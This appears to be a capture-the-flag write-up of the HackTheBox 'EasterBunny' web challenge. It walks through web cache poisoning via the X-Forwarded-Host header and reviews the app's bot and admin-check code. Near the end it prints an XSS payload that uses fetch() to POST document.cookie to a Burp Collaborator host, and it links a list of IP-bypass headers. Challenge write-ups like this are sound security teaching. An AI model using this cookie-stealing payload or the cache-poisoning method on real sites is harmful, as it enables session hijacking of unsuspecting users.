---
layout: single
title: EasterBunny
excerpt: "It's that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny's helpers are watching!"
date: 2022-8-28
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - web
tags:  
  - web cache poisoning
  - cross site scripting
  - ip bypass
  - resource hijacking
---


It's that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny's helpers are watching! <br>

<h4 align="center">
<img src="https://user-images.githubusercontent.com/45040001/187103435-e7a41ec1-67d8-491a-9572-a340b96f265e.png">
</h4>


The EasterBunny is a easy challenge from hackthebox where you can learn a lot from it. Lets explain little bit the steps but with words, the first step is to identify web cache poisoning vulnerability and follow [web cache poisoning](https://portswigger.net/research/practical-web-cache-poisoning) methodology.

## WCP Methodology
![image](https://user-images.githubusercontent.com/45040001/187235119-7f8f04e9-1a0e-4899-b623-109aae0d0ceb.png)

### Detect unkeyed input
We can detect & inject into cache a random string just using `X-Forwarded-Host` HTTP Header. Using this header we can perform a xss attack to steal some cookies from the user in our situation from `bot.js`.<br>
![detect_unkeyd_input](https://user-images.githubusercontent.com/45040001/187235463-af6684d1-b75f-422d-b08f-7515db78026a.png)

![unkeyd_input](https://user-images.githubusercontent.com/45040001/187235510-121c99c8-0160-463d-b4e2-c95af06b362a.png)

![viewletter_javascript](https://user-images.githubusercontent.com/45040001/187235528-15b5cbc5-faea-4430-bef9-f7891538de51.png)

## Code Review

### route /submit
```javascript
router.post("/submit", async (req, res) => {
    const { message } = req.body;

    if (message) {
        return db.insertMessage(message)
            .then(async inserted => {
                try {
                    botVisiting = true;
                    await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
                    botVisiting = false;
                }
                catch (e) {
                    console.log(e);
                    botVisiting = false;
                }
                res.status(201).send(response(inserted.lastID));
            })
            .catch(() => {
                res.status(500).send(response('Something went wrong!'));
            });
    }
    return res.status(401).send(response('Missing required parameters!'));
});
```

### bot.js
```javascript
const visit = async(url, authSecret) => {
    try {
        const browser = await puppeteer.launch(browser_options);
        let context = await browser.createIncognitoBrowserContext();
        let page = await context.newPage();

        await page.setCookie({
            name: 'auth',
            value: authSecret,
            domain: '127.0.0.1',
        });

        await page.goto(url, {
            waitUntil: 'networkidle2',
            timeout: 5000,
        });
        await page.waitForTimeout(3000);
        await browser.close();
    } catch (e) {
        console.log(e);
    }
};
```



### authorisation.js
```javascript
const authSecret = require('crypto').randomBytes(69).toString('hex');

const isAdmin = (req, res) => {
  return req.ip === '127.0.0.1' && req.cookies['auth'] === authSecret;
};

module.exports = {
  authSecret,
  isAdmin,
};
```



### viewletter.js (steal cookies)
```javascript
fetch('http://4w1j76r5ydqthsa2yt357tr45vbmzb.burpcollaborator.net/', {
		    method: 'POST',
		    body: document.cookie
		    });
```

[ip bypass headers](https://gist.githubusercontent.com/kaimi-/6b3c99538dce9e3d29ad647b325007c1/raw/339dad3040fd1a967588edf341eb72b033a9d9fe/gistfile1.txt)
